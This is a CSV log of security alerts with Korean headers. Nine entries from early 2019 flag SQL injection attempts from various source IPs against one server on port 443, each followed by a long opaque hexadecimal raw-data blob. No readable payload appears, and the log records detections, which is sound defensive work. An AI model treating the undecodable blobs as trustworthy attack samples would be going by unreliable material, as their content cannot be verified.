장비발생시간,출발지IP,목적지IP,목적지포트,공격명,raw_data
2019-01-25 11:37,211.114.22.75,182.162.96.253,443,SqlInjection, retInfo=C8AA50873BB8F98CF3478F5B106CE7B9F86D5B6C2C7105025BE0FE47B760149E34DD7BB0C19E0567EF1BD86D85C4CC82976BEA66422F781B440E89B65FFC6A9C8EB11C83A486D745FDD69AC5BD23332704BB7D23115B9C50755A6F99A4AA257DA5E0EA29475EC269522FB9807C97D7E04218AAD5D0C0CB037DA012DC5E8FE227459B8989D54D2FC8C835CCFE2BE42F940A29D7EDE569646011A35FC112CCD81F817BB050411ABE4C98A88C087FE87A7A82475A9F35FA3E105825FF1A69AB6EB70ED88FEA98389E0F0D3AF0BEB1145B0E86480B2C48B4009F855FA678FA299B1CA1B798CF5CF882D71BEF08BE6BE58B90134CBA3FAE903466609FB2FC0371C0B2A8CA8FA58AE669FEAA305AF5E2AC573BD19A5A7D00849007876D2BC29D57C13D8F7F6524A0F1EC152F1A01C1FFA49BCBEA3B9CFA21C8824E951D7F896543D777CE0A41ADFB09D66471299EE10C31222A05CEC4303A083D52950DA6FA077A30631E499C410E8EA28250D24E7427942EE9D2376C1BCDB1D2EDD9CCF2C681E531C0B02D47C734AE68178E667BA63CEC146DACB42A7DD3BFCC6949F74A8FFF39F5A2B90806425063B6AD6501BECE952E7BE6CC216850C46CDFD942421A13308B375B11FE79D484E5BD863E267138D44D392BB0C1D9F2997FDFDA021F92F06E099EE3925AD5678D5B96909145E7A91C0EB5E720E54B5E5E47FF5C7C0614B5E750ACEF0BC837ED3D7C518DD847B9272A56EF0846DE126358A514DA3F149C091B4D8DEB3D237AC053F2AE0E55031D1AA28194803C231046D391FD09D4F4808477AF8B93605D47A333C1DF50563BE3740DDBB7331A69F64BDF6FF3A529C93DC584C262B86F787CCF9D4B489EFAF6B72A12A1837E4030887CED7EA4F893D5B1B0ABA57529DE5895856366A93F05BFD7331C113350FB6F0DD14A892802A2E43415FAFC1D7EF88D6E06F27516132AA5FDD5AC16871FA1895E8DA247F984EB8D561A88AA9832370FAAA7563E01A5DC81521BB31BAD4E6284526ECB5800C9F4D7EAC05A059988C41E0F9D7C559B8D544D8818D526643BE469CBE364E2EEB8703F2949D6345337F419874FE0E925FFAD9F002A21A17CE0E3A00EEFE32902A3995E42E9512E8C8290C837B1EE7BCA370AB1C5A384C80FF5E4BFBA2132A74F8628C33F3E31478C368C33278F42E3DE4A4801137FF0D47617A3D87A75DAF77B09487894FC8BEEE8B731EDC15B70CD96962BAE0A7EE2213
2019-02-19 14:12,121.145.75.99,182.162.96.253,443,SqlInjection, retInfo=CA9A54EE467490E95CD25D0B9A9FE00B4B150A13587D88F8036BB308FBA005CB57E2D3EEFA55508BC9899B27FA44A478CE13617E32C89596F8DBE715B2EFF4D727D7E1253E2F54CC093D6D3B7C53DCCF8EAC065CA4D675491A2431C8465A1A78C3A03C9AF3E69AEDB69B6701F8B0D04339F129712262CD4B07C4749FB50F7E014012B94048B1162E95145336346E7359BB51AEB7CE5694696884B6D85488FED10461AFF31BBDAB74F0763C7E17B8B7110F59D6AA1282389034855F760BEA210AB114F80BEBA8C8D32E8D25A6C38C0B44F89388032930882EA417BEBD20D067C287DB4F87F6258F7E67FE8CB5DC7F92E294A7375E715B4F1AF22FDC1C6051BD55AC34A55CFB217FCD00F779EBA7C99E6749E4C5D03B3C5593F43CDA3CF609DB4776E5F871C9DF3C934A5F965D8FD8B48985618E6CE6AB13104E319C1F2BBCC0F7DE87D797A604DFDE4395D436C5F422ECBE353F8D3FCD99E136768159C87353B9A33B35CBA753E3CC365AD3A9246E1C634095AA9F90FA397C6AC2CD3EAE6EF90D733F2C3062DE6E9B4334EC40A048F48EE0DFA919187036438A9DB3959AAF401946BDC93FD43F03AB90EFAFFEADE6B3F0CE8E6E77833F6A98E994FDC29D0646A89C6C2F4212014BC277C1D7F37A54956590FCEE7C2281726EAC423299ADE0F2301E75EBC3006475711D450BCEDAF1DCE02B41A2E2BE0438649DDC28EDB65F3893AA397469E40099E2F30F7BDF432ECE0330B976CDE27ABA24BAA689ED72979C93F2E319EF4E15F9B64152A79994D886A8E68FB9A8B15CFEF765A54F2785B5D707D31B1D155FFABA459C53BAE561F9BF9B43D012FFDA23961BF743781FCCC0D3BEE6575E9ADFA7AA021CC1E98270EAD27B2A7A8DDD90A7FF30A8D93A11EF9AD6526CEBEB01049B4F9604CE824F3AF578C9B5167F7F435EC8B3D244DD265E00D22032703BF11772615D13F7F34CB66B83B7F2039A43AE1E8B783552A461AE2F3B9419AAB37CD43FE240BB9FA7551B7183292C33F6FF0F90BB923205E9104CA85DDEC29D358B3F7FF9D1A0EB1D4A0D7992EED72017F33551364DF82F55B051C29A2ADE9D99D16FAC48A522F53559CDBD1CA8810915BA7E1C6E0BEBFA4D1BC96F05E8E1E42DADAEF5B33CB47C6FAE5384F2D8A0F65EED4B38D2A84332AB09997DE9628FC039387824B25B0D7561959A4BE45FF6B46E907C5C9AFC1AAB512FE1B791C59FE18EA9DF36DFC90E8CED40E70E00
2019-02-13 11:42,220.122.159.166,182.162.96.253,443,SqlInjection, retInfo=CB9F7A74666B22C247AB2CB984EC3D1A07DD030D7FDD7CF48561998208BFE6784BDC856AE4B822B53EB6D2A42490E0B63D4F6FA876120A7B4AF79D1988C76E476CD426F0E46229095E60347334EFE2F40E3D307DF3EE252DA6F2430A9EA4DB6AE13AE19A5FA7A7B0F8F722F02274A22C37B480CAD893D853FF91917111FD1C31BAD96FD18181FE06183D5C518D0C383894216098A0746F7DEFDC889CB53CD01A64781855167CDC79CBE7247AE171914AB273AE1962CA65F5CD0ED90A7CFE288A9A3E7029198B996221D00C5E41EB5CF6CDB36DD5C2305E3361558A6B2971D17A14EA71D6ADE1C53105CCCEA8D64E1170084F3642A48F1369E8C32F8FC165971FB69B92AFB33C15DD7BB849F4806BED46CD292CA267BBD26E5FC624829FE1D29FACEA7B64E59572ADE547F6146F06A21AFD585837BAF5BCBA7D189913B002ACC0CECB5ED91E4A9BB8CFAB90174C08411B57DFA80D5BB1995B8FF20A3175542C17CB1A7572194A6F1CD2DB44CB9330896F730F3DE91D82DE9DC5F62985E00EF64A58348E9E4311230703DC41B683ED498C4F338A94CC3A5561617045E2784E9CF5213CB86989CEBEA5F3F406D18EFBB8B2A2D7F105977F55749B47A253B55838BD1606797969707F1013E9E782D5105C3B1FA307A37FC9D0611B73694D00DCBAB465C145923FAD66A8A47BBDA3989BE185C0FE884EBE58FEF71ED9A57704A5B9D1EF8484472B4AE48E1B5DCFF39A89B0DBDB5680D61717237F6A7F0E4C2F74D21E74634AAD9DE4CFBE4B5AE888A8ED50C5AD22B841A861874FC2508A855A00156CE72D031F94F8422D9A0E14C880EC077B99D52E5C1B7FD1C961AA8E2A3E4529F8A9BE4DF43484C7B2A568D77E5800406274EDCC537D30ABC2911AE71B45371048980C8C6305E47668927248FFC4220986A99561A94E81E89618E65BB4687A804A6F2BFD59BDBCBBAD699E32C7D1B49E4175BFCF1FE1998F10998CC21464ACD891FFE6B8DDA1A24C13A115585EB77EBB4DAF871C3C5079323B9512BD63C5794375AB43A21BB1CD3F5F7DA51988E4DD77AA11C3E7BBC3D3E71646FAD1E85998EC4858B4F0C3D7A6947372F1E79EB4180D50C848E2AEB4AA08DD55C92CEEE9F98A5116ACB4CA535E552B700675FB3A64C404AB63195B35BEDF02359ED49918E8D67C6475914BC498EF31AAB7C24B9711A469DCF4B95BC7664F116520F39FBFCA676304CD8A4FAC2A17E73118B909019
2019-02-06 9:05,110.54.148.32,182.162.96.253,443,SqlInjection, retInfo=CC9F5AD7F5C153C79209D7232CEA581330F1B2FC716056C9639927661F33B477020E3429119F3E082643F9F84CDBED7EFCF3E61DE06AE6D8576F14A4941047B0DB50229BCF05AB6C05F8F964F8738530CB672A15D26C387690E06A80B1F867550E25906B9E3B60CF526E723CEF675F95003C09A4726887872C568075C7B182DF8631ACAC29AF7B837563AD732916D96472A1452AB0C30026A424DFFBD622A4493A738B70A2C7C780632A3B2685324BA90967635403B25A67A25714B432463EEFB555B03BA7C465FF9A4CEF25877D3ACC7E2585411C03D07F86AEEB0C42B67103B8C4AF6271B82EA22CE814F514A66AC4623678F33FD6B8BF616FBEEF5C3D40ED7414AD3461FBFD995969A1E92C65E5D942DDA9D5105AB166F4D9061670B9F4FCA4F0017D75B20D13FE35FC5A6AA4B3D9FE2FA4ABFB6B719C8BF2D457612149B5C6394A047EE2CC9BCDDA3B412A622E0C599912BB1E6391E04107FEE499ECE353A1D3FC8059E7E4F1FD71B25276B489307EAEDB635C23E22F16C18A9C82D47E62813FA41665895301CDDF7D46FA5127D33441752840241EDCF646661DA35E7217231162D4DECB92A9A268E23D4AE48AF6A594448B0105E151FB9B1A86A0755C9671332EA906949F9EAFBD4E9CD1AD446A5367BE7E5429DA8CDEC08FB536379E31D517D582BA207B0BA2093025C876577F843624D83B0D778B863C7F3A85CE41160EACDA04BED1F0DE995A9D8787A29332799E35EAD2F5C4875E54A734D910D6ABE4F25EDB8029942EFBAF6E9B643206030F1A052E52F326550EB6E5E049D49E0F851A53EB6063FA425D101E91517582AA9534D86A12604FFE0A8B9A8CE531A01E9B17D007A0BE552EE141E6D26F91195DF90D2C7996F69ADB3E4A2EBCE0EE8C1A94D9F46F0DEB06E683091F0EE6D932D24963575058B768541E6CDE63A6E5503FF6C3E953B270A819DB7B329828515C9CCBD0033C6009E7FEC3460A5AD3B6223DF3979008BBC9E0038FCC3847A92F7758C50C06F2145959743AFE7F0D2A151E61A516017158E054D541DE6C4C0D0A31573891508FAB80C625551DF2C02DDC659B27BE2606412E8B9193D5EEDB2C58EF40F5E3808B0E3910E71DDD7EDFE2E6CFFD1C6BD3278B61D7506595A69DFCA7B2E8E74C5378F71F00E9FEFA351858D286B37C03AB42FA337AE761A8B60222DF94D6A192C9942D30082E52B829D64DA9E006D6A6888E82987AA6CF1961D484A6AA84
2019-01-25 11:35,211.114.22.75,182.162.96.253,443,SqlInjection, retInfo=D472E3BEEF814EB720122587022E235D864A907BB4F7EDB14C7C45F32E1E0B160F79F5BF273E4DBB192D0C3B49C33C310B3F43865629DFEC3901131BEA01A38DD80EE472D8F09383C7C1690E5D07C3537A9C3FA2B5188C924C8F230BB317D44D3F339479FAC84DBB51DF576C0E7C54873437DDF836F449B0BBE019726E67BFE316B6EF8FD12A6F9D1333950E07A852A14C489B0A6B966DBEA093DC02AFDF69F862CA2472038C1286556DCF46391915170BB5CA7066E2937BD2E1510DE20423FBC33C9BDF0BE93F8DE35212DB07DBC3E0AAE82467DBA349C615FCF99F183D3C4CA829107606588CFAB891239E4716F031CC7F8BAA452FDE4516EF50700D6E36806E06F54058389A6189528F5A80F198E6BB84ECEF9084ABB31F861B0C7E94D9B5C3331F759E97627CD6B6CBE674F8BED759177320A59AA2F9C4449BEF2A1E533BC45A67AB29B58078333B31C89F7BFBBB0B8CBECCB68CC4740A5AFD664BABD9D07BB50C7E3BC604135BB83D8DAC96526F5FD40727A328CFC9FB48FCE06C0E8C45E9C4DC2ED7A6F663339C44784BC5FDF196ED27399383A2A23BB9190F840013B2FED82D068AC468910F534E7AE1473BFF4EADFF0A4691782217EA36E4351ED5FE173DE4E0AC46C19A231B3E9EFD3F8CEF2F1FF093D0E9445C5D1F6EE7B471CF54E306A77FDDFC6D28A35EDCB1DBFE4C620FB44966AA78C331E9A502FBF1614929EE3C019360C6E948D000D081EE37A2978CC38C0D640B40C4897DC4023B4D18D09227871056CE830F739B20C0F8804D53E0F2C7D37608BF1ABE455D1A3E64BF662EDB40A017B3263C347D630CCF00784BEC8A60FDDB70ABF3129907743959554A3E4545C24513953D4C5909FD30933CE6883AA14F79E10D4FA2F685EE472FDE51DFD393150AA62E776960EA6707F19B81B254F67A6185AF6DE310667CF5AC4A174B5B2E7232540478E06E5E8E493781962577066F9F4BB0E797D51B3BCE751196D1C36973ADC53EEA87971F48B20FD4B425B3AC73BC51F17E9388050C6A6F73A72713951A0195373415575EA5F430B7EAEEBCF72B460D2CCF4F145D70B2CCABE8A4B26BFF219272B7EF2C23950C26A62132E8519C34BBB69DDD97327336163AF0BF91F5735BA4923B2720C23B080C09A522DF42CF96EF99C30D992D5F8055F3252A66AD227F131E284312A91A6413045B92EB174F27F6A086CCDCD12556F838DF52ABA508023EB19F00100C09908EC
2019-01-21 21:03,119.67.49.219,182.162.96.253,443,SqlInjection, retInfo=D9FF2D92F109383C3CA19B61F02E60E310E241EF2C69AC5C599DE51710D290C43442D62DACF2F3A155A05E18D7C5809A9137D38FC47619A67B69945A6AAA5887504793D3EF975A3C86F801276168595017641D196563C09DA287108D9AC15DEDDEF12B11883E4F9E24EBA9B4AF87DF04CC5D71FC22594A5E452B72BEB37F373FDECB9FC034E8B441555507A53371F29476711C6D7D5190CD7A37B39227C9583FD102AC547D1814CC9CB8FE58BD380362CA9C0EE2A1E7E9E0A4C18F740E86D5FF49CCCA3888D9CF64FB0FDE8308660D175F728BF5D4A21E0C97147F2B81EAC683F899ABF1893E1FA600D1834CA466A5AE89E9F6D4DDF6E415BF20ED006FC5158EF174E283B3B0899031F9CD4265B87B0A36FBAB8F6E9C71EE7BBBA38E955E9363ECBFBD0DD91115608344C607C31E7D1875EBD7FD005C9A9FF5614096B53D3CF361C4E5A8EF9CD00C1980A1D15F52384EC1F31E1B26A74BF03616760075559B3030284C24851551434A51BD315D70CF9C722FE89B27140EA3B32186456AF84379A8CAEC8C7A654E9F479B8E9EE21D72AD43F06AAE9915CB9E45CF163A47C90FD3DB468516CB4366F657418B4E24E57DC6D78BA64806BC06874C9447B18CA20380780E9B1F2E05081C405BA3B311CA86C73483878B123D6AAF80566B754D6242F63E7816B2E9A8B7E2A64281E35D0895803450DD8F4B3FFCE9F25948EF93E5D5B99151E4680BEEB5183A690A8F7DCC06D2485F8197DE3812C5761C35EB669E0C37FF0ECB759EC9B8CC6CA5FD13788696B3D146088A50DB37DAFF81D1FFEBDCAB9A4FA5AA0E85B96D9A7A674E87BFCB8C9287FA9F2FD9A2833B1711FD929D6750BB6B962FFC0DA55941045396445500D036EEB3FBE1378C1AF5AF7AB33B91039474C17CBCE5068E8F44AE49C169D4855A6CF10F7D3F9E8D651DBB211291C21BC91CD25429848A35E793478DE561ACFD70EAEE41A3B91DE64EEC6EECEF42B4655F4B28D5A2622BD5A9E15DC8D5FE0F97EE52CE1606777BFBA11DAC721498308CE2F13F34EAA043322608AD8BA654065C5159F1464B3824401DABA41FA229D4FCE0A187784E0F06A04EB516894514A773A1838778D7CFCC865598382C144027D77CF8A749F6CEF6C9BC2396C1330FAB185E549FFBEDEFD03CC83CF75CB1D6A16E163287B4ECA59431C3632217C2FD59C6C2E7671FE323E2CBF47D2F495D428E0DCECD8C04ABFB32D4A2F40B812B08E561CF
2019-02-17 2:10,223.62.10.237,182.162.96.253,443,SqlInjection, retInfo=DEE8C2C56985A3A8191F84FB8F5A705F77B9757D308576922BD07B802DC44E3EF9F52C20EFA3AAB3D34500D7BE79AE4CD45CF41B7E6EAE6007F96B8F193344FCEF594750B67FA297BBDCFBB1B7B8F0343ECBBC03DC28B7CADF5FAADAF5E68BE8285B7D6FBC36BD3054B70912B58C5D37639195AA9B2673FE50FA3B0B31796FE1866C05E4AD8901FD1199E4404842E89DAE8BFF13185B781701113D283E85B989EE4FE0E48BDB529CA18267828ACCD23C6DEA779463A0A58E64A992C7F0998DB25188B51EAB4E76CE5804B93B5366990F8958EC127055DF5B0BB6AE655799BD4A7BEA4BA552840CB11592515FC1B175990F7B2DDD2F702DDE5B355F0252090A1E0846E8009D4769E6EB0DB3A23758CFE0F1768377DFADE9D25C5B71FA18C915E3D26CE38B357450795998B6174A2FF1CF4F42B0F2150955E3880709FD838C4D1D55A520D86E28B1562D5DDECB74A33968FED83F109137360842F16CEF523E687DC75DFC72F26CAC8957EC94458655787B3A968F2DEA7F448883A0820A5A3B8555C826EEAC6D326F6370D044BECD0293399E0E87EC2F357A907522526F6C9C917B676BCA82C579825A5D63C2339F6A40D33C42FF2461D036A94B236113A735F1F1E90A84BDF0988A10363C51DAAA96F5FCCFEAD3F7BBEFD001413B281F5DA4F981325A5F7F7A4BB765C1016F385A7E58F1EA8AFCCD66167C358B77DBC24A909A46701DE210812AF9B03068BDA837B7CA6E032F7AC52C9FDA6AABEDB050F7DD420219F02F63038234B4D680C8E5CDBF9E2E9914AF68231C0823DC7714B9846E7CA4BD68831E17482DC09FB663D5FDC56D316C27DF3DBD00B79295C9AC7850A0428852B98D18A38E116F621B6944C7B1102A23B410C969D6AEE22714897B3D49E8DB06737EB144B9332FDE6D0646AFE7446E66892C47FF7C90A85AFFEEF95421E1860EB916367D644ADDDB37E5917517B9B9265D33C7645C6E4759FC318817218DB9513EC796D6C627A51E5E193333EB424C7C19C6219167E6F142186436F755146D6F45A3CF1A9622C0F335021EDF60C3DD5F5A657F27E95864CE622EE28DB917C56E0DB73F4F3ED57D931AC5DF21FDA49B996B3371A30495EF74A5E8FBA975B51191A8DAA8D21F88886457EFD0CA61AE787E89D52671D4E1A4D8FAE8FDB0BF3AF851416A3B5D5437A418FBD45C9C4A0093962056C4955EBFE15FDF3ED6A13298052FD01A21BDDDDFC0CAD822219B1D6EE4
2019-01-21 10:07,219.255.150.198,182.162.96.253,443,SqlInjection, retInfo=E737CAD75DB6BA2D153EBF7BB5A277CC541356D1498446C973095CAE5C05975F81B1770EFB4715CC8055551D46FE67E29ED44BABE454B24938C89B8CA50670F921D947F318F13B6917F9BAA4EE24E70626B0AE2880C8189F465EC9BB2E3F0924DEA6E0797ACF64ED68BAE911F62FD8E0DC0EC55433AF429572616B2D7764D8E6993B02642858938016E117A5DA3107499AF1E3C8609B6E92204131F43E6AE87CC66E1B14DE1B102FA867632FCE6F57D575FCC20ACCFE924F4511E0B434AA1EAA08B83FCAFF8B808D2659F778BF11602C3B4C7CF666BA09789DA22BBA6E0618EE175890D13B7B623DCC782601360AFB1B6A68FEE12D727BEC3AC522C3A45B3C138835375C59EB4F76BB7CE7653882916880D1AF286994A8700069E2B2EE63284C9901E6E865B3931A28484D2C2F51D579263E62DBD968E27A2F05EE0FCD96F743DA786D7A7FE21EEBC7C49EB08844C8CF19CFDEF0AE371485142BBD006613C94F432D120F97FA89EAAA6D1A01A4C4859A96906B75582CE89FB919219C9D67A0BC08160974FEA75807F16F222C64DC70C5D493E6CE5678FCD5F8824B607FFFA1D67C2AE455B0D15FE3DA323167F9286E7D3035E9DE42351E189918606ECF11AAE6CBCF6FC4721E4E7B5B009F2B189E76D9084344DC3DC7AF24EFAC0C76EC45C1A8B88560B77D0948CC9B7122CBD1B0F61BF8AE381A607157CC7D41D4B302FED20D9CBDD386B52F6452315E0F81B866E27C6CB4553CE6981CB59EBDA305235B3498A31BB0505EBFEF88B858948888C1B79A9C6ADEBDCE79B50239757EBF5735006CE76D56FE64CE1C4C4D358C32F2CC77DE5F17766841B6B75261282F83E39C05D75068C46E1243ADAEC5E62501157239387D661AE1093510DF9E5DB4867F75387DEDDF496FB5F9F346CF4635191B81FBA02988E7E64BE05BAEDDA9E58C4EA3CE1118E34C6341C664A0E5AD3F24E1864B6388B94474B16C6813206754FAB97322D4FF440683FA711E264B60CAEB060C5D2452763ED652FED8C9112262E3DB20846055E3F56AAEC4D2CEBEE468A66EA724F8C67F0885900B64F62F7F6600B0A70E48BCCEF1104614562D8FDE0BF8E7038B16AC068DD1CDA6A84FD6DCA41EEC43184B4BC33467EAC36102D7A0F4E2942CB05255F0CB3135925F581C7B90624E0B83BA11E58DB42A8BFD86B17B29FB1BF36202339063812FF269F0E30FC615C250472CF2022F374614D6233B81893EE9CC
2019-02-07 7:13,152.99.89.57,182.162.96.253,443,SqlInjection, retInfo=E75C93D96AE0B5AC6E23C51891238312D55E2922B5A445FB7F6EF701786D544829ADD7D4BCBFB184DECA3E5A794502D8EF5752EA21F19696464A8D58B802003B2BCA377A05C765069EC6298F09B9D8D83480633FBF6B8D5378ACAB56CEE9284F06366505EA198B12AF9A2E123D7ADE6C0000B7211CD5ED1DA41E9C2FA1504196BD9780FE2CD118CF5E55807133EA164B94CF9DE808B6DCF26EA3AE91B8F42E21634CA998632093A71A570027CB09BA3836DD8CC0CE2D9503DF63581F2709BC47CF6C1062CA55CA3AF49CA2089E7231E677C207144A81285BE1F63315DA4B4B0C3B37FB8F82F6DC38A8C0AC54AAFC9667CD0909785DA9D325314D4A3495054D477C635B7524118C89DC4D3A7FA8D2C3ADB81AB8D522F9AD688DD3C5CECB502487632C78AF9998CD0DD255F31FF816A7B85A8B6DB1EE9A004D3E189076F741A306FA328536D6ED89FF4CBA6065C55A915B1EC32F20A90781DE9686AC828D456F3DB2BBAF5825EBB96A72FD799494C1B679E3D1FFAA90466F9640F00714A2E9BA44B2FEBD0ED2294630B2414CB680B81415FC92E5C6A6A76045F3CDF4AF2B2BF66E5BAE8B798516E00B7ABFF88B8D8A090149AED51A0C5AD2C591B99E7B23B89D222546D0BB717CC9E3F1A34EB651AE4ADEB41A730260474CEB052E03FE9E3B291556A2D544B7170B8D3FEBE04DB1DC04B700D56D1AC360505C9DD240C60945314D53F8D77320E776D62FED2FD082E92C05A43A0BDA25EAD71EC6CE51C0B0A3633CA72DE4DE7A2789B78BAD909FAA35A5EF316900EA7035E7081A17E7059ABE78BFF5336D37085EE44E41D6C654FBB0AA60BCE8CF1B27AA8BD52F30CAF4C1CCCCA5AE9A3A4F12998EEA47A7EBE1ED03DBC52FA1A39482FA60F53911BFA17D6B2E785B8837444EAB58B2EE7533711B7BB4B103CE4AB5996D8D252551F21223A4290263F31166A6B74BA80F1F531981F38FA2634F40E9821A6478251B44186FFA46785B096BB76BDB3DD30C6A87B40AE6FFA8699111043FB57F604FAF030FC7543CDA9597FA8255DDA24C024EA1B958A8CB31A893326B8BDAF5C92E55FF1E2695491933E5BC2F47E78A89E9012273B9096A5FDC0C109ABEEFD0FDFF23C3D61849306438980C1309E9809520462E990D37792BC2543CA66AE8E1D2537978EFEB9377D9803E862EECFEDA849ADB5D14A72C17B62CF727883B4BF5EE4EB3CAF37F9DAB9DEE826C6AB69767C4961BB0C7EAFFD69E
